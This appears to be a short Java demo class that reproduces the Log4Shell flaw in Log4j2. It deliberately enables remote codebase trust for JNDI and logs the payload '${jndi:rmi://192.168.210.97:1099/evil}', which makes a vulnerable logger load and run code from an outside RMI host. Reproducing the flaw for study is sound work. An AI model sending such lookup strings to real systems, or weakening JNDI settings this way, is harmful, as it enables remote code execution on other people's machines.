package org.triumphxx;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author:triumphxx
 * @Date: 2021/12/16
 * @Time: 13:05
 * @微信公众号：北漂码农有话说
 * @网站：http://blog.triumphxx.com.cn
 * @GitHub https://github.com/triumphxx
 * @Desc:
 **/
public class Log4j2Test {
    public static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "true");
        String str = "${jndi:rmi://192.168.210.97:1099/evil}";
        String str1 = "${java:os}";
        String str2 = "${java:vm}";
        LOGGER.info("执行的东西为：{}", str);
        LOGGER.info("执行的东西为：{}", str1);
        LOGGER.info("执行的东西为：{}", str2);
    }
}
